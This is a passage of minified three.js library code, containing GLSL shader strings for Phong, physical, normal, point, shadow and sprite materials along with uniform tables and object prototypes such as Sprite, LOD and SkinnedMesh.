<skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#ifndef FLAT_SHADED\n\t\tvNormal = normalize( transformedNormal );\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n\tvViewPosition = - mvPosition.xyz;\n}",meshphong_frag:"#define PHONG\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform vec3 specular;\nuniform float shininess;\nuniform float opacity;\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_pars_fragment>\n#include <gradientmap_pars_fragment>\n#include <fog_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <lights_phong_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\t#include <emissivemap_fragment>\n\t#include <lights_phong_fragment>\n\t#include <lights_fragment_begin>\n\t#include <lights_fragment_maps>\n\t#include <lights_fragment_end>\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\n\t#include <envmap_fragment>\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshphong_vert:"#define PHONG\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <envmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n#ifndef FLAT_SHADED\n\tvNormal = normalize( transformedNormal );\n#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvViewPosition = - mvPosition.xyz;\n\t#include <worldpos_vertex>\n\t#include <envmap_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",meshphysical_frag:"#define STANDARD\n#ifdef PHYSICAL\n\t#define REFLECTIVITY\n\t#define CLEARCOAT\n\t#define TRANSPARENCY\n#endif\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform float roughness;\nuniform float metalness;\nuniform float opacity;\n#ifdef TRANSPARENCY\n\tuniform float transparency;\n#endif\n#ifdef REFLECTIVITY\n\tuniform float reflectivity;\n#endif\n#ifdef CLEARCOAT\n\tuniform float clearcoat;\n\tuniform float clearcoatRoughness;\n#endif\n#ifdef USE_SHEEN\n\tuniform vec3 sheen;\n#endif\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <bsdfs>\n#include <cube_uv_reflection_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_physical_pars_fragment>\n#include <fog_pars_fragment>\n#include <lights_pars_begin>\n#include <lights_physical_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <clearcoat_normalmap_pars_fragment>\n#include <roughnessmap_pars_fragment>\n#include <metalnessmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <roughnessmap_fragment>\n\t#include <metalnessmap_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\t#include <clearcoat_normal_fragment_begin>\n\t#include <clearcoat_normal_fragment_maps>\n\t#include <emissivemap_fragment>\n\t#include <lights_physical_fragment>\n\t#include <lights_fragment_begin>\n\t#include <lights_fragment_maps>\n\t#include <lights_fragment_end>\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\n\t#ifdef TRANSPARENCY\n\t\tdiffuseColor.a *= saturate( 1. - transparency + linearToRelativeLuminance( reflectedLight.directSpecular + reflectedLight.indirectSpecular ) );\n\t#endif\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshphysical_vert:"#define STANDARD\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n#ifndef FLAT_SHADED\n\tvNormal = normalize( transformedNormal );\n\t#ifdef USE_TANGENT\n\t\tvTangent = normalize( transformedTangent );\n\t\tvBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );\n\t#endif\n#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvViewPosition = - mvPosition.xyz;\n\t#include <worldpos_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",normal_frag:"#define NORMAL\nuniform float opacity;\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( TANGENTSPACE_NORMALMAP )\n\tvarying vec3 vViewPosition;\n#endif\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <packing>\n#include <uv_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\t#include <logdepthbuf_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\tgl_FragColor = vec4( packNormalToRGB( normal ), opacity );\n}",normal_vert:"#define NORMAL\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( TANGENTSPACE_NORMALMAP )\n\tvarying vec3 vViewPosition;\n#endif\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n#ifndef FLAT_SHADED\n\tvNormal = normalize( transformedNormal );\n\t#ifdef USE_TANGENT\n\t\tvTangent = normalize( transformedTangent );\n\t\tvBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );\n\t#endif\n#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( TANGENTSPACE_NORMALMAP )\n\tvViewPosition = - mvPosition.xyz;\n#endif\n}",points_frag:"uniform vec3 diffuse;\nuniform float opacity;\n#include <common>\n#include <color_pars_fragment>\n#include <map_particle_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_particle_fragment>\n\t#include <color_fragment>\n\t#include <alphatest_fragment>\n\toutgoingLight = diffuseColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <premultiplied_alpha_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}",points_vert:"uniform float size;\nuniform float scale;\n#include <common>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <color_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <project_vertex>\n\tgl_PointSize = size;\n\t#ifdef USE_SIZEATTENUATION\n\t\tbool isPerspective = ( projectionMatrix[ 2 ][ 3 ] == - 1.0 );\n\t\tif ( isPerspective ) gl_PointSize *= ( scale / - mvPosition.z );\n\t#endif\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <worldpos_vertex>\n\t#include <fog_vertex>\n}",shadow_frag:"uniform vec3 color;\nuniform float opacity;\n#include <common>\n#include <packing>\n#include <fog_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <shadowmap_pars_fragment>\n#include <shadowmask_pars_fragment>\nvoid main() {\n\tgl_FragColor = vec4( color, opacity * ( 1.0 - getShadowMask() ) );\n\t#include <fog_fragment>\n}",shadow_vert:"#include <fog_pars_vertex>\n#include <shadowmap_pars_vertex>\nvoid main() {\n\t#include <begin_vertex>\n\t#include <project_vertex>\n\t#include <worldpos_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",sprite_frag:"uniform vec3 diffuse;\nuniform float opacity;\n#include <common>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <alphatest_fragment>\n\toutgoingLight = diffuseColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}",sprite_vert:"uniform float rotation;\nuniform vec2 center;\n#include <common>\n#include <uv_pars_vertex>\n#include <fog_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\tvec4 mvPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );\n\tvec2 scale;\n\tscale.x = length( vec3( modelMatrix[ 0 ].x, modelMatrix[ 0 ].y, modelMatrix[ 0 ].z ) );\n\tscale.y = length( vec3( modelMatrix[ 1 ].x, modelMatrix[ 1 ].y, modelMatrix[ 1 ].z ) );\n\t#ifndef USE_SIZEATTENUATION\n\t\tbool isPerspective = ( projectionMatrix[ 2 ][ 3 ] == - 1.0 );\n\t\tif ( isPerspective ) scale *= - mvPosition.z;\n\t#endif\n\tvec2 alignedPosition = ( position.xy - ( center - vec2( 0.5 ) ) ) * scale;\n\tvec2 rotatedPosition;\n\trotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;\n\trotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;\n\tmvPosition.xy += rotatedPosition;\n\tgl_Position = projectionMatrix * mvPosition;\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n}"},ys={common:{diffuse:{value:new b(15658734)},opacity:{value:1},map:{value:null},uvTransform:{value:new a},alphaMap:{value:null}},specularmap:{specularMap:{value:null}},envmap:{envMap:{value:null},flipEnvMap:{value:-1},reflectivity:{value:1},refractionRatio:{value:.98},maxMipLevel:{value:0}},aomap:{aoMap:{value:null},aoMapIntensity:{value:1}},lightmap:{lightMap:{value:null},lightMapIntensity:{value:1}},emissivemap:{emissiveMap:{value:null}},bumpmap:{bumpMap:{value:null},bumpScale:{value:1}},normalmap:{normalMap:{value:null},normalScale:{value:new i(1,1)}},displacementmap:{displacementMap:{value:null},displacementScale:{value:1},displacementBias:{value:0}},roughnessmap:{roughnessMap:{value:null}},metalnessmap:{metalnessMap:{value:null}},gradientmap:{gradientMap:{value:null}},fog:{fogDensity:{value:25e-5},fogNear:{value:1},fogFar:{value:2e3},fogColor:{value:new b(16777215)}},lights:{ambientLightColor:{value:[]},lightProbe:{value:[]},directionalLights:{value:[],properties:{direction:{},color:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},directionalShadowMap:{value:[]},directionalShadowMatrix:{value:[]},spotLights:{value:[],properties:{color:{},position:{},direction:{},distance:{},coneCos:{},penumbraCos:{},decay:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},spotShadowMap:{value:[]},spotShadowMatrix:{value:[]},pointLights:{value:[],properties:{color:{},position:{},decay:{},distance:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{},shadowCameraNear:{},shadowCameraFar:{}}},pointShadowMap:{value:[]},pointShadowMatrix:{value:[]},hemisphereLights:{value:[],properties:{direction:{},skyColor:{},groundColor:{}}},rectAreaLights:{value:[],properties:{color:{},position:{},width:{},height:{}}}},points:{diffuse:{value:new b(15658734)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},uvTransform:{value:new a}},sprite:{diffuse:{value:new b(15658734)},opacity:{value:1},center:{value:new i(.5,.5)},rotation:{value:0},map:{value:null},uvTransform:{value:new a}}},xs={basic:{uniforms:X([ys.common,ys.specularmap,ys.envmap,ys.aomap,ys.lightmap,ys.fog]),vertexShader:vs.meshbasic_vert,fragmentShader:vs.meshbasic_frag},lambert:{uniforms:X([ys.common,ys.specularmap,ys.envmap,ys.aomap,ys.lightmap,ys.emissivemap,ys.fog,ys.lights,{emissive:{value:new b(0)}}]),vertexShader:vs.meshlambert_vert,fragmentShader:vs.meshlambert_frag},phong:{uniforms:X([ys.common,ys.specularmap,ys.envmap,ys.aomap,ys.lightmap,ys.emissivemap,ys.bumpmap,ys.normalmap,ys.displacementmap,ys.gradientmap,ys.fog,ys.lights,{emissive:{value:new b(0)},specular:{value:new b(1118481)},shininess:{value:30}}]),vertexShader:vs.meshphong_vert,fragmentShader:vs.meshphong_frag},standard:{uniforms:X([ys.common,ys.envmap,ys.aomap,ys.lightmap,ys.emissivemap,ys.bumpmap,ys.normalmap,ys.displacementmap,ys.roughnessmap,ys.metalnessmap,ys.fog,ys.lights,{emissive:{value:new b(0)},roughness:{value:.5},metalness:{value:.5},envMapIntensity:{value:1}}]),vertexShader:vs.meshphysical_vert,fragmentShader:vs.meshphysical_frag},matcap:{uniforms:X([ys.common,ys.bumpmap,ys.normalmap,ys.displacementmap,ys.fog,{matcap:{value:null}}]),vertexShader:vs.meshmatcap_vert,fragmentShader:vs.meshmatcap_frag},points:{uniforms:X([ys.points,ys.fog]),vertexShader:vs.points_vert,fragmentShader:vs.points_frag},dashed:{uniforms:X([ys.common,ys.fog,{scale:{value:1},dashSize:{value:1},totalSize:{value:2}}]),vertexShader:vs.linedashed_vert,fragmentShader:vs.linedashed_frag},depth:{uniforms:X([ys.common,ys.displacementmap]),vertexShader:vs.depth_vert,fragmentShader:vs.depth_frag},normal:{uniforms:X([ys.common,ys.bumpmap,ys.normalmap,ys.displacementmap,{opacity:{value:1}}]),vertexShader:vs.normal_vert,fragmentShader:vs.normal_frag},sprite:{uniforms:X([ys.sprite,ys.fog]),vertexShader:vs.sprite_vert,fragmentShader:vs.sprite_frag},background:{uniforms:{uvTransform:{value:new a},t2D:{value:null}},vertexShader:vs.background_vert,fragmentShader:vs.background_frag},cube:{uniforms:{tCube:{value:null},tFlip:{value:-1},opacity:{value:1}},vertexShader:vs.cube_vert,fragmentShader:vs.cube_frag},equirect:{uniforms:{tEquirect:{value:null}},vertexShader:vs.equirect_vert,fragmentShader:vs.equirect_frag},distanceRGBA:{uniforms:X([ys.common,ys.displacementmap,{referencePosition:{value:new r},nearDistance:{value:1},farDistance:{value:1e3}}]),vertexShader:vs.distanceRGBA_vert,fragmentShader:vs.distanceRGBA_frag},shadow:{uniforms:X([ys.lights,ys.fog,{color:{value:new b(0)},opacity:{value:1}}]),vertexShader:vs.shadow_vert,fragmentShader:vs.shadow_frag}};xs.physical={uniforms:X([xs.standard.uniforms,{transparency:{value:0},clearcoat:{value:0},clearcoatRoughness:{value:0},sheen:{value:new b(0)},clearcoatNormalScale:{value:new i(1,1)},clearcoatNormalMap:{value:null}}]),vertexShader:vs.meshphysical_vert,fragmentShader:vs.meshphysical_frag},rt.prototype=Object.create(U.prototype),rt.prototype.constructor=rt,at.prototype=Object.create(F.prototype),at.prototype.constructor=at,vt.prototype=Object.create(o.prototype),vt.prototype.constructor=vt,vt.prototype.isCubeTexture=!0,Object.defineProperty(vt.prototype,"images",{get:function(){return this.image},set:function(t){this.image=t}}),yt.prototype=Object.create(o.prototype),yt.prototype.constructor=yt,yt.prototype.isDataTexture2DArray=!0,xt.prototype=Object.create(o.prototype),xt.prototype.constructor=xt,xt.prototype.isDataTexture3D=!0;var bs=new o,ws=new yt,_s=new xt,Ms=new vt,Ss=[],Ts=[],Es=new Float32Array(16),Cs=new Float32Array(9),As=new Float32Array(4);Qt.prototype.updateCache=function(t){var e=this.cache;t instanceof Float32Array&&e.length!==t.length&&(this.cache=new Float32Array(t.length)),_t(e,t)},te.prototype.setValue=function(t,e,i){for(var n=this.seq,r=0,a=n.length;r!==a;++r){var o=n[r];o.setValue(t,e[o.id],i)}};var Ls=/([\w\d_]+)(\])?(\[|\.)?/g;ee.prototype.setValue=function(t,e,i,n){void 0!==(e=this.map[e])&&e.setValue(t,i,n)},ee.prototype.setOptional=function(t,e,i){void 0!==(e=e[i])&&this.setValue(t,i,e)},ee.upload=function(t,e,i,n){for(var r=0,a=e.length;r!==a;++r){var o=e[r],s=i[o.id];!1!==s.needsUpdate&&o.setValue(t,s.value,n)}},ee.seqWithValue=function(t,e){for(var i=[],n=0,r=t.length;n!==r;++n){var a=t[n];a.id in e&&i.push(a)}return i};var Ps=0,Rs=0;Te.prototype=Object.create(T.prototype),Te.prototype.constructor=Te,Te.prototype.isMeshDepthMaterial=!0,Te.prototype.copy=function(t){return T.prototype.copy.call(this,t),this.depthPacking=t.depthPacking,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this.map=t.map,this.alphaMap=t.alphaMap,this.displacementMap=t.displacementMap,this.displacementScale=t.displacementScale,this.displacementBias=t.displacementBias,this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this},Ee.prototype=Object.create(T.prototype),Ee.prototype.constructor=Ee,Ee.prototype.isMeshDistanceMaterial=!0,Ee.prototype.copy=function(t){return T.prototype.copy.call(this,t),this.referencePosition.copy(t.referencePosition),this.nearDistance=t.nearDistance,this.farDistance=t.farDistance,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this.map=t.map,this.alphaMap=t.alphaMap,this.displacementMap=t.displacementMap,this.displacementScale=t.displacementScale,this.displacementBias=t.displacementBias,this},Re.prototype=Object.assign(Object.create(p.prototype),{constructor:Re,isGroup:!0}),Oe.prototype=Object.assign(Object.create(Z.prototype),{constructor:Oe,isArrayCamera:!0});var Os=new r,Is=new r;Object.assign(ze.prototype,e.prototype),Object.assign(De.prototype,e.prototype),Object.assign(ke.prototype,{isFogExp2:!0,clone:function(){return new ke(this.color,this.density)},toJSON:function(){return{type:"FogExp2",color:this.color.getHex(),density:this.density}}}),Object.assign(Be.prototype,{isFog:!0,clone:function(){return new Be(this.color,this.near,this.far)},toJSON:function(){return{type:"Fog",color:this.color.getHex(),near:this.near,far:this.far}}}),Object.defineProperty(Fe.prototype,"needsUpdate",{set:function(t){!0===t&&this.version++}}),Object.assign(Fe.prototype,{isInterleavedBuffer:!0,onUploadCallback:function(){},setArray:function(t){if(Array.isArray(t))throw new TypeError("THREE.BufferAttribute: array should be a Typed Array.");return this.count=void 0!==t?t.length/this.stride:0,this.array=t,this},setDynamic:function(t){return this.dynamic=t,this},copy:function(t){return this.array=new t.array.constructor(t.array),this.count=t.count,this.stride=t.stride,this.dynamic=t.dynamic,this},copyAt:function(t,e,i){t*=this.stride,i*=e.stride;for(var n=0,r=this.stride;n<r;n++)this.array[t+n]=e.array[i+n];return this},set:function(t,e){return void 0===e&&(e=0),this.array.set(t,e),this},clone:function(){return(new this.constructor).copy(this)},onUpload:function(t){return this.onUploadCallback=t,this}}),Object.defineProperties(He.prototype,{count:{get:function(){return this.data.count}},array:{get:function(){return this.data.array}}}),Object.assign(He.prototype,{isInterleavedBufferAttribute:!0,setX:function(t,e){return this.data.array[t*this.data.stride+this.offset]=e,this},setY:function(t,e){return this.data.array[t*this.data.stride+this.offset+1]=e,this},setZ:function(t,e){return this.data.array[t*this.data.stride+this.offset+2]=e,this},setW:function(t,e){return this.data.array[t*this.data.stride+this.offset+3]=e,this},getX:function(t){return this.data.array[t*this.data.stride+this.offset]},getY:function(t){return this.data.array[t*this.data.stride+this.offset+1]},getZ:function(t){return this.data.array[t*this.data.stride+this.offset+2]},getW:function(t){return this.data.array[t*this.data.stride+this.offset+3]},setXY:function(t,e,i){return t=t*this.data.stride+this.offset,this.data.array[t+0]=e,this.data.array[t+1]=i,this},setXYZ:function(t,e,i,n){return t=t*this.data.stride+this.offset,this.data.array[t+0]=e,this.data.array[t+1]=i,this.data.array[t+2]=n,this},setXYZW:function(t,e,i,n,r){return t=t*this.data.stride+this.offset,this.data.array[t+0]=e,this.data.array[t+1]=i,this.data.array[t+2]=n,this.data.array[t+3]=r,this}}),Ge.prototype=Object.create(T.prototype),Ge.prototype.constructor=Ge,Ge.prototype.isSpriteMaterial=!0,Ge.prototype.copy=function(t){return T.prototype.copy.call(this,t),this.color.copy(t.color),this.map=t.map,this.rotation=t.rotation,this.sizeAttenuation=t.sizeAttenuation,this};var zs,Ds=new r,Ns=new r,ks=new r,Bs=new i,Fs=new i,Hs=new h,Gs=new r,js=new r,Us=new r,Vs=new i,Ws=new i,qs=new i;je.prototype=Object.assign(Object.create(p.prototype),{constructor:je,isSprite:!0,raycast:function(t,e){null===t.camera&&console.error('THREE.Sprite: "Raycaster.camera" needs to be set in order to raycast against sprites.'),Ns.setFromMatrixScale(this.matrixWorld),Hs.copy(t.camera.matrixWorld),this.modelViewMatrix.multiplyMatrices(t.camera.matrixWorldInverse,this.matrixWorld),ks.setFromMatrixPosition(this.modelViewMatrix),t.camera.isPerspectiveCamera&&!1===this.material.sizeAttenuation&&Ns.multiplyScalar(-ks.z);var n=this.material.rotation;if(0!==n)var r=Math.cos(n),a=Math.sin(n);n=this.center,Ue(Gs.set(-.5,-.5,0),ks,n,Ns,a,r),Ue(js.set(.5,-.5,0),ks,n,Ns,a,r),Ue(Us.set(.5,.5,0),ks,n,Ns,a,r),Vs.set(0,0),Ws.set(1,0),qs.set(1,1);var o=t.ray.intersectTriangle(Gs,js,Us,!1,Ds);null===o&&(Ue(js.set(-.5,.5,0),ks,n,Ns,a,r),Ws.set(0,1),null===(o=t.ray.intersectTriangle(Gs,Us,js,!1,Ds)))||(a=t.ray.origin.distanceTo(Ds))<t.near||a>t.far||e.push({distance:a,point:Ds.clone(),uv:x.getUV(Ds,Gs,js,Us,Vs,Ws,qs,new i),face:null,object:this})},clone:function(){return new this.constructor(this.material).copy(this)},copy:function(t){return p.prototype.copy.call(this,t),void 0!==t.center&&this.center.copy(t.center),this}});var Xs=new r,Ys=new r;Ve.prototype=Object.assign(Object.create(p.prototype),{constructor:Ve,isLOD:!0,copy:function(t){p.prototype.copy.call(this,t,!1);for(var e=0,i=(t=t.levels).length;e<i;e++){var n=t[e];this.addLevel(n.object.clone(),n.distance)}return this},addLevel:function(t,e){void 0===e&&(e=0),e=Math.abs(e);for(var i=this.levels,n=0;n<i.length&&!(e<i[n].distance);n++);return i.splice(n,0,{distance:e,object:t}),this.add(t),this},getObjectForDistance:function(t){for(var e=this.levels,i=1,n=e.length;i<n&&!(t<e[i].distance);i++);return e[i-1].object},raycast:function(t,e){Xs.setFromMatrixPosition(this.matrixWorld);var i=t.ray.origin.distanceTo(Xs);this.getObjectForDistance(i).raycast(t,e)},update:function(t){var e=this.levels;if(1<e.length){Xs.setFromMatrixPosition(t.matrixWorld),Ys.setFromMatrixPosition(this.matrixWorld),t=Xs.distanceTo(Ys),e[0].object.visible=!0;for(var i=1,n=e.length;i<n&&t>=e[i].distance;i++)e[i-1].object.visible=!1,e[i].object.visible=!0;for(;i<n;i++)e[i].object.visible=!1}},toJSON:function(t){(t=p.prototype.toJSON.call(this,t)).object.levels=[];for(var e=this.levels,i=0,n=e.length;i<n;i++){var r=e[i];t.object.levels.push({object:r.object.uuid,distance:r.distance})}return t}}),We.prototype=Object.assign(Object.create(H.prototype),{constructor:We,isSkinnedMesh:!0,bind:function(t,e){this.skeleton=t,void 0===e&&(this.updateMatrixWorld(!0),this.skeleton.calculateInverses(),e=this.matrixWorld),this.bindMatrix.copy(e),this.bindMatrixInverse.getInverse(e)},pose:function(){this.skeleton.pose()},normalizeSkinWeights:function(){for(var t=new s,e=this.geometry.attributes.skinWeight,i=0,n=e.count;i<n;i++){t.x=e.getX(i),t.y=e.getY(i),t.z=e.getZ(i),t.w=e.getW(i);var r=1/t.manhattanLength();1/0!==r?t.multiplyScalar(r):t.set(1,0,0,0),e.setXYZW(i,t.x,t.y,t.z,t.w)}},updateMatrixWorld:function(t){H.prototype.updateMatrixWorld.call(this,t),"attached"===this.bindMode?this.bindMatrixInverse.getInverse(this.matrixWorld):"detached"===this.bindMode?this.bindMatrixInverse.getInverse(this.bindMatrix):console.warn("THREE.SkinnedMesh: Unrecognized bindMode: "+this.bindMode)},clone:function(){return new this.constructor(this.geometry,this.material).copy(this)}});var $s=new h,Zs=new h;Object.assign(qe.prototype,{calculateInverses:function(){this.boneInverses=[];for(var t=0,e=this.bones.length;t<e;t++){var i=new h;this.bones[t]&&i.getInverse(this.bones[t].matrixWorld),this.boneInverses.push(i)}},pose:function(){var 